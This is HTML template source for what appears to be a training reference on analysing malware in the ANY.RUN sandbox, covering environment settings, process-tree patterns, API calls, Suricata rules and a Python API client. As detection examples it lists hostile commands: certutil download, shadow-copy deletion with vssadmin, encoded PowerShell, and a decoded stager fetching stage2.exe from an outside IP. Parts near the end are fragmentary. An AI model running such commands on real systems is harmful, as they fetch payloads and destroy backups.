<template id="tpl-overview">
  <h1>ANY.RUN — Interactive Malware Sandbox</h1>
  <div class="osi-bar">
    <span class="osi-label">OSI Layers</span>
    <span class="osi-chip l3">L3 Network</span>
    <span class="osi-chip l4">L4 Transport</span>
    <span class="osi-chip l7">L7 Application</span>
    <span class="osi-note">ANY.RUN captures full malware execution including L3 C2 IP connections, L4 TCP/UDP port behavior, and L7 HTTP/DNS/HTTPS application-layer traffic.</span>
  </div>
  <p>ANY.RUN is a cloud-based interactive malware sandbox that lets analysts observe, interact with, and investigate malware in real time inside a live Windows or Linux VM. Unlike automated sandboxes (Cuckoo), ANY.RUN gives you live mouse/keyboard control of the analysis environment — critical for defeating evasion techniques that detect non-interactive execution.</p>

  <h2>Key Differentiators vs. Cuckoo</h2>
  <table>
    <tr><th>Feature</th><th>ANY.RUN</th><th>Cuckoo Sandbox</th></tr>
    <tr><td>Interaction</td><td>Live — mouse, keyboard, browser control</td><td>Automated — no interaction</td></tr>
    <tr><td>Deployment</td><td>Cloud SaaS (no setup required)</td><td>Self-hosted (VM infrastructure needed)</td></tr>
    <tr><td>Evasion Defeat</td><td>Manual interaction defeats user-activity checks</td><td>Evasion often succeeds against automated</td></tr>
    <tr><td>Real-time View</td><td>Watch process tree, network, and disk live</td><td>Review report after analysis completes</td></tr>
    <tr><td>Collaboration</td><td>Share task URLs publicly or with team</td><td>Private (local deployment)</td></tr>
    <tr><td>Cost</td><td>Free tier (public tasks); paid for private</td><td>Free (self-hosted)</td></tr>
    <tr><td>OS Support</th><td>Windows 7/10/11, Linux (Ubuntu)</td><td>Windows 7/10, Linux</td></tr>
  </table>

  <h2>Platform Architecture</h2>
  <table>
    <tr><th>Component</th><th>Role</th></tr>
    <tr><td>Analysis VM</td><td>Isolated Windows/Linux VM where sample runs</td></tr>
    <tr><td>Network Interceptor</td><td>Captures all HTTP/HTTPS/DNS in real time; HTTPS decrypted via MitM</td></tr>
    <tr><td>Process Monitor</td><td>API hooking + kernel driver — records syscalls, process creation, registry, file I/O</td></tr>
    <tr><td>Suricata IDS</td><td>Real-time rule matching against captured network traffic</td></tr>
    <tr><td>MITRE ATT&amp;CK Mapper</td><td>Maps observed behaviors to ATT&amp;CK techniques automatically</td></tr>
    <tr><td>IOC Extractor</td><td>Extracts network IOCs (IPs/domains/URLs) and host IOCs (hashes/paths/registry keys)</td></tr>
    <tr><td>Report Engine</td><td>Generates shareable HTML report, JSON export, MISP-compatible IOC list</td></tr>
  </table>

  <h2>Free vs. Paid Tiers</h2>
  <table>
    <tr><th>Feature</th><th>Free (Community)</th><th>Paid (Individual/Team)</th></tr>
    <tr><td>Task visibility</td><td>Public (visible to all)</td><td>Private</td></tr>
    <tr><td>Analysis duration</td><td>60 seconds</td><td>Up to 10 minutes</td></tr>
    <tr><td>File size limit</td><td>16 MB</td><td>100 MB</td></tr>
    <tr><td>Windows versions</td><td>Win 7 only</td><td>Win 7, 10, 11</td></tr>
    <tr><td>HTTPS decryption</td><td>Limited</td><td>Full</td></tr>
    <tr><td>API access</td><td>No</td><td>Yes</td></tr>
    <tr><td>Team sharing</td><td>No</td><td>Yes</td></tr>
  </table>

  <div class="callout warn">
    <strong>Privacy Warning</strong> — Free tier tasks are public. Never submit real malware samples that may contain sensitive victim data, proprietary documents, or PII. Use private tasks for operational samples.
  </div>

<template id="tpl-submission">
  <h1>Task Submission &amp; Environment Configuration</h1>
  <div class="osi-bar">
    <span class="osi-label">OSI Layers</span>
    <span class="osi-chip l7">L7 Application</span>
    <span class="osi-note">Task submission and environment configuration operate at L7 — files, URLs, and configuration are transmitted via the HTTPS web interface or REST API.</span>
  </div>
  <p>ANY.RUN tasks can be created by uploading a file, submitting a URL, or using the API. Environment configuration determines how the sample is executed and how evasion is defeated.</p>

  <h2>Submission Methods</h2>
  <table>
    <tr><th>Method</th><th>Use Case</th></tr>
    <tr><td>File Upload</td><td>Submit executable, document, archive, or script for analysis</td></tr>
    <tr><td>URL Analysis</td><td>Submit a URL — ANY.RUN opens it in a browser and observes drive-by download or phishing behavior</td></tr>
    <tr><td>Hash Lookup</td><td>Search existing public tasks by SHA-256 (free); if found, view existing analysis</td></tr>
    <tr><td>API Submission</td><td>Programmatic submission for SOAR/SIEM integration (paid)</td></tr>
  </table>

  <h2>Environment Settings</h2>
  <table>
    <tr><th>Setting</th><th>Options</th><th>Recommendation</th></tr>
    <tr><td>OS Version</td><td>Windows 7, 10, 11, Ubuntu 22.04</td><td>Match target environment; use Win 10 for most modern malware</td></tr>
    <tr><td>Bitness</td><td>32-bit, 64-bit</td><td>Match sample bitness; 64-bit for most modern threats</td></tr>
    <tr><td>User Activity Simulation</td><td>None, Mouse movement, Realistic (scrolling)</td><td>Enable — defeats many sandbox evasion checks</td></tr>
    <tr><td>Network</td><td>Enabled / Disabled / Fake network</td><td>Enabled — allows C2 callback, DNS, HTTP to be captured</td></tr>
    <tr><td>Residence</td><td>Various countries</td><td>Select target region — geo-fenced malware may only activate in specific countries</td></tr>
    <tr><td>Browser</td><td>IE, Chrome, Firefox</td><td>Match phishing target; Chrome for most modern lures</td></tr>
    <tr><td>Start Program</td><td>Auto-detect / Specify</td><td>Specify for DLL: use rundll32.exe with export name</td></tr>
    <tr><td>UAC Prompt</td><td>Auto-confirm / Leave</td><td>Auto-confirm for full execution path; leave for realistic analysis</td></tr>
    <tr><td>Archive Password</td><td>Text field</td><td>Enter if sample is password-protected (common in phishing: "infected", "virus")</td></tr>
  </table>

  <h2>Sample Type Execution Paths</h2>
  <table>
    <tr><th>File Type</th><th>Execution Method</th><th>Notes</th></tr>
    <tr><td>.exe</td><td>Direct execution</td><td>Auto-detected</td></tr>
    <tr><td>.dll</td><td><code>rundll32.exe sample.dll,ExportName</code></td><td>Specify export; try <code>DllMain</code>, <code>Run</code>, <code>Install</code></td></tr>
    <tr><td>.doc/.docx</td><td>Opened in Word</td><td>Enable macros in settings; check "enable editing" interaction</td></tr>
    <tr><td>.xls/.xlsm</td><td>Opened in Excel</td><td>Enable macros; watch for Excel4 macro (XLM) abuse</td></tr>
    <tr><td>.pdf</td><td>Opened in Acrobat Reader</td><td>Watch for JavaScript execution, embedded objects</td></tr>
    <tr><td>.ps1</td><td><code>powershell.exe -File sample.ps1</code></td><td>Enable script execution policy bypass in settings</td></tr>
    <tr><td>.js/.vbs/.hta</td><td><code>wscript.exe</code> / <code>cscript.exe</code> / <code>mshta.exe</code></td><td>Common dropper formats</td></tr>
    <tr><td>.lnk</td><td>Shell execute</td><td>Often contains embedded commands</td></tr>
    <tr><td>URL</td><td>Browser navigates to URL</td><td>Captures phishing page, drive-by download</td></tr>
  </table>

  <h2>Defeating Evasion Techniques</h2>
  <ul>
    <li><strong>User Activity</strong>: Enable mouse simulation — defeats checks for mouse movement (a common sandbox detector)</li>
    <li><strong>Time Acceleration</strong>: ANY.RUN can fast-forward the clock — defeats time-bomb malware that sleeps for N minutes</li>
    <li><strong>Country Spoofing</strong>: Select specific country — defeats geo-fencing (malware that only runs in Ukraine, Russia, etc.)</li>
    <li><strong>Interactive Clicks</strong>: You can click "Enable Content" in Office documents, dismiss dialogs, and follow infection chains manually</li>
    <li><strong>HTTPS Decryption</strong>: MitM certificate injection — decrypts TLS traffic for analysis (paid)</li>
  </ul>

  <div class="xref-group">
    <span>Related:</span>
    <a href="#" class="xref" onclick="loadTopic('process'); return false;">Process Tree ↗</a>
    <a href="#" class="xref" onclick="loadTopic('network'); return false;">Network Activity ↗</a>
  </div>

  <hr class="tier-divider">
  <div class="tier-heading">Skill Tiers</div>
  <details class="tier beginner" open>
    <summary>🟢 Beginner — Core Concepts</summary>
    <div class="tier-body">
      <h4>Submitting Your First Sample</h4>
      <ul>
        <li>Upload a file or paste a URL into the New Task dialog at app.any.run</li>
        <li>Select Windows 10 64-bit as the OS for most modern malware samples</li>
        <li>Enable "User Activity: Mouse movement" to defeat basic sandbox evasion checks</li>
        <li>Keep network enabled so L3/L4 C2 callbacks and L7 HTTP/DNS traffic are captured</li>
      </ul>
      <pre><code><span class="cm"># Basic submission checklist:</span>
<span class="cm"># OS: Windows 10 (64-bit)</span>
<span class="cm"># User Activity: Mouse movement (realistic)</span>
<span class="cm"># Network: Enabled</span>
<span class="cm"># Duration: 60s (free) or 120s (paid)</span>
<span class="cm"># Click "Run" and watch the live analysis</span></code></pre>
    </div>
  </details>
  <details class="tier intermediate">
    <summary>🟡 Intermediate — Deeper Skills</summary>
    <div class="tier-body">
      <h4>Environment Tuning for Evasive Samples</h4>
      <ul>
        <li>Use country spoofing to defeat geo-fenced malware that only activates in specific regions</li>
        <li>Specify DLL exports manually: <code>rundll32.exe sample.dll,ExportName</code></li>
        <li>Enable time acceleration to defeat time-bomb malware that sleeps before executing</li>
        <li>For password-protected archives, enter the password ("infected" or "virus" are common phishing archive passwords)</li>
      </ul>
      <pre><code><span class="cm"># DLL analysis: specify export in "Start Program" field</span>
rundll32.exe sample.dll,DllMain
rundll32.exe sample.dll,Run
rundll32.exe sample.dll,Install

<span class="cm"># Office macro: set "Enable Content" auto-click = Yes</span>
<span class="cm"># UAC Prompt: Auto-confirm for full execution path</span></code></pre>
    </div>
  </details>
  <details class="tier advanced">
    <summary>🔴 Advanced — Expert Techniques</summary>
    <div class="tier-body">
      <h4>Defeating Advanced Evasion During Submission</h4>
      <ul>
        <li>Combine country + browser + user-activity settings to defeat multi-condition evasion (geo + interaction + browser version checks)</li>
        <li>Enable HTTPS decryption (paid) to get full L7 visibility into TLS-encrypted C2 — otherwise C2 payloads are opaque</li>
        <li>Use fake network mode to prevent live C2 beacon registration while still observing outbound connection attempts</li>
      </ul>
      <pre><code><span class="cm"># Defeating multi-condition evasion:</span>
<span class="cm"># OS: Windows 10 (64-bit) + Country: Ukraine + Browser: Chrome</span>
<span class="cm"># User Activity: Realistic (scrolling) + UAC: Auto-confirm</span>
<span class="cm"># Time Acceleration: +30 minutes (bypasses time-bomb sleep)</span>
<span class="cm"># HTTPS Decryption: Enabled (MitM cert injection for L7 TLS visibility)</span></code></pre>
    </div>
  </details>
</template>

<template id="tpl-process">
  <h1>Live Process Tree Navigation</h1>
  <div class="osi-bar">
    <span class="osi-label">OSI Layers</span>
    <span class="osi-chip l7">L7 Application</span>
    <span class="osi-note">Process tree analysis operates at L7 — it tracks application-layer behavior: process creation, API calls, file/registry operations, and script execution chains within the analysis VM.</span>
  </div>
  <p>The process tree is the most important view in ANY.RUN. It shows all processes spawned during analysis in a parent-child hierarchy, color-coded by suspicion level, with API call logs, file and registry operations accessible per process.</p>

  <h2>Process Tree Color Coding</h2>
  <table>
    <tr><th>Color</th><th>Meaning</th></tr>
    <tr><td style="color:#4caf50">Green</td><td>Normal system process — low suspicion</td></tr>
    <tr><td style="color:#ff9800">Orange</td><td>Suspicious behavior detected</td></tr>
    <tr><td style="color:#f44336">Red</td><td>Malicious — confirmed by signature, behavior, or Suricata rule</td></tr>
    <tr><td style="color:#9e9e9e">Gray</td><td>Injected process or terminated process</td></tr>
  </table>

  <h2>Key Fields Per Process</h2>
  <table>
    <tr><th>Field</th><th>Description</th></tr>
    <tr><td>PID</td><td>Process ID</td></tr>
    <tr><td>Image</td><td>Executable name and path</td></tr>
    <tr><td>Command Line</td><td>Full command line arguments — critical for dropper analysis</td></tr>
    <tr><td>Parent PID</td><td>Parent process — unusual parents reveal injection/spawning chains</td></tr>
    <tr><td>Start Time</td><td>Timestamp relative to analysis start (seconds)</td></tr>
    <tr><td>Status</td><td>Running / Exited / Injected</td></tr>
    <tr><td>Severity</td><td>Suspicion level (Info / Suspicious / Malicious)</td></tr>
  </table>

  <h2>Suspicious Process Chain Patterns</h2>
  <table>
    <tr><th>Pattern</th><th>Technique</th><th>ATT&amp;CK</th></tr>
    <tr><td><code>WINWORD.EXE → cmd.exe → powershell.exe</code></td><td>Macro dropper</td><td>T1566 Phishing + T1059.001</td></tr>
    <tr><td><code>Excel.exe → regsvr32.exe → rundll32.exe</code></td><td>XLM macro / DLL hijack</td><td>T1218.010 + T1218.011</td></tr>
    <tr><td><code>mshta.exe → wscript.exe → cmd.exe</code></td><td>HTA dropper chain</td><td>T1218.005</td></tr>
    <tr><td><code>explorer.exe → malware.exe</code> (unusual parent)</td><td>Process hollowing or injection</td><td>T1055</td></tr>
    <tr><td><code>powershell.exe -enc [base64]</code></td><td>Encoded PowerShell execution</td><td>T1059.001 + T1027</td></tr>
    <tr><td><code>svchost.exe → [unsigned DLL]</code></td><td>DLL injection into service</td><td>T1055.001</td></tr>
    <tr><td><code>certutil.exe -urlcache -split -f</code></td><td>LOLBin download</td><td>T1105</td></tr>
    <tr><td><code>wmic.exe process call create</code></td><td>Lateral movement / execution</td><td>T1047</td></tr>
    <tr><td><code>vssadmin.exe delete shadows</code></td><td>Shadow copy deletion (ransomware prep)</td><td>T1490</td></tr>
  </table>

  <h2>API Call Analysis</h2>
  <p>Click any process → <strong>More Details</strong> → <strong>API Calls</strong> tab. Shows every Windows API call with arguments and return values.</p>
  <table>
    <tr><th>API Category</th><th>Key APIs</th><th>Indicates</th></tr>
    <tr><td>Network</td><td>WSAConnect, InternetOpenUrl, HttpSendRequest</td><td>C2 communication, download</td></tr>
    <tr><td>File System</td><td>CreateFile, WriteFile, DeleteFile, MoveFile</td><td>File drop, encryption, persistence</td></tr>
    <tr><td>Registry</td><td>RegSetValue, RegCreateKey, RegDeleteKey</td><td>Persistence, configuration storage</td></tr>
    <tr><td>Process</td><td>CreateProcess, OpenProcess, WriteProcessMemory</td><td>Process injection, lateral movement</td></tr>
    <tr><td>Crypto</td><td>CryptEncrypt, CryptAcquireContext, BCryptEncrypt</td><td>Ransomware file encryption</td></tr>
    <tr><td>Anti-analysis</td><td>IsDebuggerPresent, CheckRemoteDebuggerPresent, GetTickCount</td><td>Sandbox/debugger detection</td></tr>
    <tr><td>Persistence</td><td>SetWindowsHookEx, RegisterClassEx</td><td>Keylogger, hook installation</td></tr>
  </table>

  <div class="xref-group">
    <span>Related:</span>
    <a href="#" class="xref" onclick="loadTopic('network'); return false;">Network Activity ↗</a>
    <a href="#" class="xref" onclick="loadTopic('ioc'); return false;">IOC Extraction ↗</a>
    <a href="#" class="xref" onclick="loadTopic('attack'); return false;">ATT&CK Mapping ↗</a>
  </div>

  <hr class="tier-divider">
  <div class="tier-heading">Skill Tiers</div>
  <details class="tier beginner" open>
    <summary>🟢 Beginner — Core Concepts</summary>
    <div class="tier-body">
      <h4>Reading the Process Tree</h4>
      <ul>
        <li>Green processes are low-suspicion; orange are suspicious; red are confirmed malicious</li>
        <li>Parent-child relationships reveal infection chains — e.g., Word spawning PowerShell is always suspicious</li>
        <li>Click any process to see its full command line, which exposes encoded payloads and download URLs</li>
        <li>Process tree operates at L7 — it shows application execution behavior, not network packets</li>
      </ul>
      <pre><code><span class="cm"># Suspicious parent-child patterns to watch for:</span>
WINWORD.EXE → cmd.exe        <span class="cm"># macro execution</span>
Excel.exe → regsvr32.exe     <span class="cm"># XLM macro / LOLBin abuse</span>
mshta.exe → wscript.exe      <span class="cm"># HTA dropper chain</span>
powershell.exe -enc [base64] <span class="cm"># encoded download stager</span></code></pre>
    </div>
  </details>
  <details class="tier intermediate">
    <summary>🟡 Intermediate — Deeper Skills</summary>
    <div class="tier-body">
      <h4>API Call Analysis per Process</h4>
      <ul>
        <li>Click a process → More Details → API Calls to see every Windows API call with arguments</li>
        <li>Network APIs (WSAConnect, InternetOpenUrl) confirm C2 communication paths</li>
        <li>Crypto APIs (CryptEncrypt, BCryptEncrypt) confirm ransomware file encryption activity</li>
        <li>Anti-analysis APIs (IsDebuggerPresent, GetTickCount) reveal sandbox evasion attempts</li>
      </ul>
      <pre><code><span class="cm"># API sequences that confirm process injection:</span>
OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
<span class="cm"># T1055.001 — DLL injection confirmed by this API chain</span>

<span class="cm"># Shadow copy deletion confirms ransomware:</span>
vssadmin.exe delete shadows /all /quiet  <span class="cm"># T1490</span></code></pre>
    </div>
  </details>
  <details class="tier advanced">
    <summary>🔴 Advanced — Expert Techniques</summary>
    <div class="tier-body">
      <h4>Decoding Encoded Execution Chains</h4>
      <ul>
        <li>Base64-encoded PowerShell arguments (-enc flag) hide download URLs and secondary payloads — always decode them</li>
        <li>Process hollowing shows as CreateProcess (suspended) + NtUnmapViewOfSection + WriteProcessMemory — check ALL three APIs</li>
        <li>Cross-reference process command lines with network panel — confirm which process made which L3/L4 connection</li>
      </ul>
      <pre><code><span class="cm"># Decode base64 PowerShell command from process tree:</span>
echo "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0..." | base64 -d
<span class="cm"># Reveals: Invoke-WebRequest -Uri http://185.220.101.47/stage2.exe</span>

<span class="cm"># Process hollowing API sequence to alert on:</span>
<span class="cm"># CreateProcess (CREATE_SUSPENDED) → NtUnmapViewOfSection</span>
<span class="cm"># → VirtualAllocEx → WriteProcessMemory → SetThreadContext → ResumeThread</span></code></pre>
    </div>
  </details>
</template>

  <h2>Reading a Suricata Alert</h2>
  <pre><code># ANY.RUN Threats panel — example alert:
# SID: 2403342
# Message: ET TROJAN Win32/AgentTesla Keylogger Data Exfil via SMTP
# Severity: Critical
# Protocol: TCP / SMTP
# Src: 10.0.2.15:49827 → Dst: 185.220.101.47:587
# Timestamp: +00:00:47

# This tells us:
# - AgentTesla keylogger is exfiltrating data via SMTP
# - Destination IP 185.220.101.47 on port 587 (mail submission)
# - Occurred 47 seconds into analysis

# Block in firewall:
# Rule: deny tcp any any -> 185.220.101.47 587</code></pre>

  <h2>Writing Custom Suricata Rules from ANY.RUN Observations</h2>
  <pre><code># 1. Identify unique HTTP request pattern from ANY.RUN HTTP tab:
#    URI: /jquery-3.3.1.slim.min.js
#    Cookie header starts with "__cfduid=d"
#    Interval: every 60 seconds

# 2. Write Suricata rule:
alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"Cobalt Strike Default Beacon URI";
  flow:established,to_server;
  http.uri;
  content:"/jquery-3.3.1.slim.min.js";
  http.cookie;
  content:"__cfduid=d";
  classtype:trojan-activity;
  sid:9000001;
  rev:1;
)

# 3. Validate rule syntax:
suricata -T -c /etc/suricata/suricata.yaml -S custom.rules

# 4. Test against downloaded PCAP:
suricata -r analysis.pcap -l /tmp/suricata_out/ -S custom.rules
cat /tmp/suricata_out/fast.log</code></pre>

# Splunk — search for alert category:
source="suricata" alert.category="trojan-activity"

# Security Onion — KQL in Kibana Discover:
event.dataset:suricata AND suricata.eve.alert.signature_id:2403342</code></pre>

  -H "Content-Type: application/json" \

    "obj_url": "https://suspicious-phishing-site.example.com/invoice.html",

  }'</code></pre>

  <h2>Python Integration Example</h2>
  <pre><code">import requests
import time

API_KEY = "YOUR_API_KEY"
BASE_URL = "https://api.any.run/v1"
HEADERS = {"Authorization": f"API-Key {API_KEY}"}

def submit_hash_lookup(sha256_hash):
    """Check if ANY.RUN has existing analysis for a hash."""
    # ANY.RUN doesn't have direct hash search in v1 API
    # Use submissions search instead:
    resp = requests.get(
        f"{BASE_URL}/analysis",
        headers=HEADERS,
        params={"hash": sha256_hash}
    )
    return resp.json()

def get_iocs(task_id):
    """Retrieve IOCs from completed task."""
    resp = requests.get(
        f"{BASE_URL}/analysis/{task_id}/ioc",
        headers=HEADERS
    )
    return resp.json()

def submit_file(file_path):
    with open(file_path, "rb") as f:
        resp = requests.post(
            f"{BASE_URL}/analysis",
            headers=HEADERS,
            files={"file": f},
            data={
                "obj_type": "file",
                "env_os": "windows",
                "env_version": "10",
                "opt_timeout": 120
            }
        )
    task_id = resp.json()["data"]["taskid"]
    print(f"Submitted. Task ID: {task_id}")

    # Poll for completion
    while True:
        time.sleep(15)
        status = requests.get(
            f"{BASE_URL}/analysis/{task_id}",
            headers=HEADERS
        ).json()
        if status["data"]["status"] == "done":
            break

    return get_iocs(task_id)</code></pre>
